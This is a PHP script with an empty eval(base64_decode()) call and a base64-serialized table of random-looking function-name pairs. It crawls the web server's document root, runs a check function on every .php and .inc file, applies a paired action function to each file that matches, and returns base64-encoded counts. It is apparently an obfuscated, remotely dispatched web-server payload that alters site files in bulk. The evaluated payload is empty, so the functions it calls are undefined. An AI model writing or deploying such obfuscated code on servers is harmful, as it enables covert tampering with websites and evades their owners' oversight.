eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo5OiJyYmh4YXZhbHMiO2k6MjtzOjg6Imd3eW1nbXdjIjt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czo0OiJyb25zIjtpOjI7czo0OiJnaGNsIjt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6NzoicmJod2NycyI7aToyO3M6NzoiZ29kYXJ1cSI7fWk6MzthOjM6e2k6MDtpOjE4O2k6MTtzOjk6InJhY3RyeW9haSI7aToyO3M6NDoiZ2xkaCI7fWk6NDthOjM6e2k6MDtpOjIzO2k6MTtzOjc6InJkZm1kdW0iO2k6MjtzOjQ6ImdhaGEiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo3OiJyaHBrYm1tIjtpOjI7czo4OiJnZGpjaWlnZCI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjU6InJsZ3l1IjtpOjI7czo4OiJnemFieXdmYSI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjg6InJ4eHVtaHRyIjtpOjI7czo0OiJneW5hIjt9aTo4O2E6Mzp7aTowO2k6NjA7aToxO3M6MTE6InJoZmhibHBpdWNrIjtpOjI7czoxMToiZ3Fzd29seGtqeGYiO31pOjk7YTozOntpOjA7aTo4OTtpOjE7czo1OiJyamlnayI7aToyO3M6MTA6ImdobXhpd2F0aGIiO31pOjEwO2E6Mzp7aTowO2k6MTA5O2k6MTtzOjEwOiJyZWNza2phbGxoIjtpOjI7czo3OiJndmN4a2t6Ijt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo3OiJyaGR5cXh5IjtpOjI7czo4OiJnaGl5c3Z5biI7fWk6MTI7YTozOntpOjA7aToxMTE7aToxO3M6OToicmJodHZycml4IjtpOjI7czo1OiJnYXNjZCI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6MTE6InJ5dG9xcmJyY3J2IjtpOjI7czoxMDoiZ2hhaGVlbGxyayI7fWk6MTQ7YTozOntpOjA7aToxMTU7aToxO3M6OToicmpieGxhdndhIjtpOjI7czoxMDoiZ29zeXNyYXJ2bCI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6ODoicnlhZ3psZm0iO2k6MjtzOjExOiJnYXFvb2J2bXBsZyI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NToicnlqeXMiO2k6MjtzOjExOiJndHhwcm1ydGlmaCI7fWk6MTc7YTozOntpOjA7aToxMjc7aToxO3M6MTE6InJzd2dmcnN3cG5tIjtpOjI7czo3OiJnYWJ5bnVrIjt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czo0OiJyaHFvIjtpOjI7czo0OiJnaG9pIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo5OiJyeXBya2Jsd2siO2k6MjtzOjQ6Imd5c2wiO31pOjIwO2E6Mzp7aTowO2k6MTM4O2k6MTtzOjk6InJvcXBoZG91cCI7aToyO3M6MTA6ImdtZnRqaXRhb3IiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjExOiJycHd4a2JraXRndyI7aToyO3M6NjoiZ21wcW5vIjt9aToyMjthOjM6e2k6MDtpOjE1NztpOjE7czoxMDoicm14cmludWJseCI7aToyO3M6NzoiZ3pmZ3FvbCI7fWk6MjM7YTozOntpOjA7aToxNjM7aToxO3M6MTA6InJpdXhuanVsamQiO2k6MjtzOjk6ImdvaWdybG1layI7fWk6MjQ7YTozOntpOjA7aToxNzI7aToxO3M6MTA6InJvd2V3ZnB3bGkiO2k6MjtzOjc6Imdxc3phd3MiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjY6InJkZWlqbCI7aToyO3M6NDoiZ2xlYSI7fWk6MjY7YTozOntpOjA7aToxNzk7aToxO3M6MTE6InJ2dnJyd2x3em13IjtpOjI7czo5OiJnY29sam1rZG4iO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjc6InJoc2thd3YiO2k6MjtzOjY6ImdhZ3NubiI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6OToicmliYWdvc2V4IjtpOjI7czo1OiJnZ3N0YyI7fWk6Mjk7YTozOntpOjA7aToxOTI7aToxO3M6MTE6InJ4eHZkdnRkeWZnIjtpOjI7czo1OiJnam1hZSI7fWk6MzA7YTozOntpOjA7aToxOTY7aToxO3M6ODoicnRrdHppYXYiO2k6MjtzOjQ6Imd2c3EiO31pOjMxO2E6Mzp7aTowO2k6MTk4O2k6MTtzOjEwOiJyc3JraGFsZXR1IjtpOjI7czo1OiJndHhvbCI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6OToicmpwd2NqeWRyIjtpOjI7czo3OiJncGlzbmJnIjt9aTozMzthOjM6e2k6MDtpOjIwMDtpOjE7czo2OiJyaHpoaXciO2k6MjtzOjk6ImdxdGp0amlnZSI7fWk6MzQ7YTozOntpOjA7aToyMDE7aToxO3M6NDoicmluaiI7aToyO3M6MTE6ImdkcHlncHl3dXpuIjt9aTozNTthOjM6e2k6MDtpOjIwMztpOjE7czoxMToicmtsaG5iZXltaHMiO2k6MjtzOjc6Imd0aGdxdm0iO31pOjM2O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjY6InJoaGt5bSI7aToyO3M6NDoiZ3B2aSI7fWk6Mzc7YTozOntpOjA7aToyMDk7aToxO3M6Nzoicmdmb2pjbCI7aToyO3M6NDoiZ2lycyI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6NDoicnR1ZSI7aToyO3M6NjoiZ3dmY3VsIjt9aTozOTthOjM6e2k6MDtpOjIxMjtpOjE7czo1OiJya3dneiI7aToyO3M6NToiZ3RzeGciO31pOjQwO2E6Mzp7aTowO2k6MjEzO2k6MTtzOjg6InJuZmV0dnJ0IjtpOjI7czo4OiJnY3lhY2todiI7fWk6NDE7YTozOntpOjA7aToyMTQ7aToxO3M6NDoicmZreSI7aToyO3M6MTE6ImdmbmNyZWJya2J0Ijt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czo3OiJybXZ5bHdqIjtpOjI7czo4OiJncHBnYWNlYyI7fWk6NDM7YTozOntpOjA7aToyMTY7aToxO3M6MTA6InJ4bXBkbnZnZm4iO2k6MjtzOjExOiJnaHVtZmdwZHVlcSI7fWk6NDQ7YTozOntpOjA7aToyMTc7aToxO3M6MTE6InJpZXlsdWN6bHJqIjtpOjI7czo4OiJnamtqZG10cCI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6NzoicnZsa2FzcCI7aToyO3M6NToiZ3JyYXQiO31pOjQ2O2E6Mzp7aTowO2k6MjIxO2k6MTtzOjEwOiJyeWNxaHlnbXBqIjtpOjI7czoxMDoiZ2tseGZpeGNvdyI7fWk6NDc7YTozOntpOjA7aToyMjI7aToxO3M6NzoicmFqdmVhcCI7aToyO3M6MTE6Imdqd3JqaXB0YnZxIjt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo4OiJyemJyd3VxaiI7aToyO3M6NjoiZ2FodXh0Ijt9aTo0OTthOjM6e2k6MDtpOjIyNDtpOjE7czoxMDoicmFtanl4bm1zYSI7aToyO3M6MTE6Imdyand0aHlsa2JxIjt9aTo1MDthOjM6e2k6MDtpOjIyNTtpOjE7czo1OiJyY3d0bSI7aToyO3M6NDoiZ2dxcSI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6MTA6InJzbXRpd2dqeWsiO2k6MjtzOjEwOiJnd2tjcWpndXNqIjt9aTo1MjthOjM6e2k6MDtpOjIzMjtpOjE7czo1OiJyYWN5biI7aToyO3M6NzoiZ25laGZneiI7fWk6NTM7YTozOntpOjA7aToyMzU7aToxO3M6NToicnZiZ2wiO2k6MjtzOjEwOiJnb3JkdHhnbXN3Ijt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czo3OiJycW1vdWl4IjtpOjI7czo2OiJnZGJoam8iO31pOjU1O2E6Mzp7aTowO2k6MjM3O2k6MTtzOjQ6InJ4bXQiO2k6MjtzOjEwOiJna3dhanRvc3hzIjt9aTo1NjthOjM6e2k6MDtpOjIzODtpOjE7czo0OiJyenhqIjtpOjI7czo1OiJncWl0bCI7fWk6NTc7YTozOntpOjA7aToyMzk7aToxO3M6ODoicmdkaGx2aHUiO2k6MjtzOjk6Imd2ZHJtbWdhYiI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6MTA6InJqdW50Z2lkdHEiO2k6MjtzOjQ6ImdpaW4iO31pOjU5O2E6Mzp7aTowO2k6MjQxO2k6MTtzOjU6InJwZ2p5IjtpOjI7czoxMDoiZ2Zwd2Zqc3Z5ZyI7fWk6NjA7YTozOntpOjA7aToyNDI7aToxO3M6OToicnJ4dHRxa2dtIjtpOjI7czo5OiJnYmJ2YWhhcmEiO31pOjYxO2E6Mzp7aTowO2k6MjQzO2k6MTtzOjk6InJ0eGZ0Y3VudiI7aToyO3M6NzoiZ3FkdGR6aiI7fWk6NjI7YTozOntpOjA7aToyNDQ7aToxO3M6NDoicnNtZyI7aToyO3M6NzoiZ2ZpbnhwZyI7fWk6NjM7YTozOntpOjA7aToyNDU7aToxO3M6OToicnh5b294d2dhIjtpOjI7czo3OiJnbG53cnJoIjt9aTo2NDthOjM6e2k6MDtpOjI0NjtpOjE7czoxMToicnJzc2NzY2NuZ24iO2k6MjtzOjk6Imd0ZmtyenZhayI7fWk6NjU7YTozOntpOjA7aToyNDc7aToxO3M6MTE6InJja3phaHliZWt4IjtpOjI7czoxMDoiZ21ibGRkZHhuaiI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6NzoicnR6cGJvaiI7aToyO3M6NDoiZ2ZyciI7fWk6Njc7YTozOntpOjA7aToyNDk7aToxO3M6OToicnFqeXd1YXlqIjtpOjI7czoxMToiZ2pxamhia2hjb3oiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjEwOiJya2Z2eGRvam9sIjtpOjI7czoxMToiZ3FkdWxrc21zbWciO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjEwOiJycHp1bmZ4ZW90IjtpOjI7czoxMToiZ254dmNuaXRveWIiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjg6InJwcHFwZGd5IjtpOjI7czo5OiJnYWlyYm9xemEiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjg6InJkcm52b3ZiIjtpOjI7czo5OiJnZnd4cmliZWYiO31pOjcyO2E6Mzp7aTowO2k6MjU0O2k6MTtzOjQ6InJ3cWIiO2k6MjtzOjU6ImdrZnFiIjt9aTo3MzthOjM6e2k6MDtpOjI1NTtpOjE7czoxMToicnR3cHF5Y2xzeHAiO2k6MjtzOjg6ImdxcWpkbmxoIjt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czoxMToicnBqaHhjdGppcmEiO2k6MjtzOjU6ImdoanliIjt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo3OiJybGt4ZGR1IjtpOjI7czo2OiJnZWhoa2EiO31pOjc2O2E6Mzp7aTowO2k6MjU4O2k6MTtzOjEwOiJyaHBpZHV2dmNiIjtpOjI7czo4OiJndmp4a2p1bCI7fWk6Nzc7YTozOntpOjA7aToyNTk7aToxO3M6ODoicmpjYnVwZ3kiO2k6MjtzOjQ6ImdlanoiO31pOjc4O2E6Mzp7aTowO2k6MjYwO2k6MTtzOjQ6InJ2YWwiO2k6MjtzOjk6Imd1dW5mZmdnciI7fWk6Nzk7YTozOntpOjA7aToyNjE7aToxO3M6NjoicnRqd3h2IjtpOjI7czo4OiJnamFndWNubiI7fWk6ODA7YTozOntpOjA7aToyNjI7aToxO3M6MTA6InJpeXl4YmNnZmIiO2k6MjtzOjk6Imd4a2thYmR3cCI7fWk6ODE7YTozOntpOjA7aToyNjM7aToxO3M6NToicmVjbXoiO2k6MjtzOjk6ImdmZmxjY3N4ZyI7fWk6ODI7YTozOntpOjA7aToyNjQ7aToxO3M6MTA6InJmY25vb3dlb2giO2k6MjtzOjg6Imd5dXZwdnJxIjt9aTo4MzthOjM6e2k6MDtpOjI2NTtpOjE7czoxMDoicnRmbXBqYmd0bCI7aToyO3M6ODoiZ2Z5Z3BmcnciO31pOjg0O2E6Mzp7aTowO2k6MjY2O2k6MTtzOjY6InJqdmp4YyI7aToyO3M6ODoiZ2h5b2Fnc3AiO319"));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();